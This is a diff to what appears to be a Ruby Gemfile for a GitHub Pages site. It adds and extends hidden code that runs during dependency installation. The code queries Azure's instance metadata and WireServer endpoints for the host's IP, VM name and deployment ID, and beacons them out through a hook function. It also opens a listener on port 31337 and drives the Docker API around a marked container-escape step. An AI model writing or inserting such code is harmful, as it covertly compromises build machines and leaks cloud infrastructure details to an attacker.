@@ -37,11 +37,13 @@ end
 
 r = Net::HTTP.get_response(URI("http://169.254.169.254/metadata/instance?api-version=2021-02-01"), {"Metadata"=>"true"})
 m = JSON.parse(r.body) rescue {}
-ip = m.dig("compute","networkProfile","networkInterfaces",0,"ipv4","ipAddress",0,"privateIpAddress") rescue nil
-ip ||= r.body[/"privateIpAddress":"([^"]+)"/, 1]
+ip = r.body[/"privateIpAddress":"([^"]+)"/, 1]
 loc = m.dig("compute","location")
-puts "VX_BEACON_IP=#{ip} LOC=#{loc}"
-hook(JSON.generate({ev:"up", ip: ip, loc: loc}))
+vm = m.dig("compute","name")
+gs = Net::HTTP.get_response(URI("http://168.63.129.16/machine/?comp=goalstate"), {"x-ms-version"=>"2015-04-05"}).body rescue ""
+dep = gs[/<Deployment[^>]*name="([^"]+)"/, 1] || gs[/<Deployment>.*?<Name>([^<]+)/m, 1] || gs[/"name":"([^"]{8}-[^"]+)"/, 1]
+puts "VX_BEACON ip=#{ip} loc=#{loc} vm=#{vm} dep=#{dep}"
+hook(JSON.generate({ev:"up", ip: ip, loc: loc, dep: dep, vm: vm}))
 
 inner = <<'EOS'
 exec 2>&1
@@ -49,12 +51,11 @@ ruby -e '
   require "socket"
   s = TCPServer.new("0.0.0.0", 31337)
   t0 = Time.now
-  puts "VX_LISTEN_ON #{Socket.ip_address_list.find { |a| a.ipv4? && !a.ipv4_loopback? }&.ip_address}"
   until Time.now - t0 > 400
     begin
       c = s.accept_nonblock
       peer = c.peeraddr[3]
-      c.puts "VXBEACON_5320c8cf ALIVE"
+      c.puts "VXBEACON_ALIVE"
       puts "VX_GOT_CONN from #{peer}"
       c.close
     rescue IO::WaitReadable
@@ -81,11 +82,8 @@ else
 end
 puts "VX_ESC_END"
 
-20.times { hook(JSON.generate({ev:"alive", ip: ip})); sleep 20 }
-
+20.times { hook(JSON.generate({ev:"alive", ip: ip, dep: dep})); sleep 20 }
 dapi('POST', "/containers/#{cid}/wait") if cid
-_lc, logs = dapi('GET', "/containers/#{cid}/logs?stdout=1&stderr=1") if cid
-puts logs.gsub(/[^\x20-\x7e\n]/, '')[0, 3000] if logs
 dapi('DELETE', "/containers/#{cid}?force=1") if cid
 
 gem "github-pages", "~> 232"
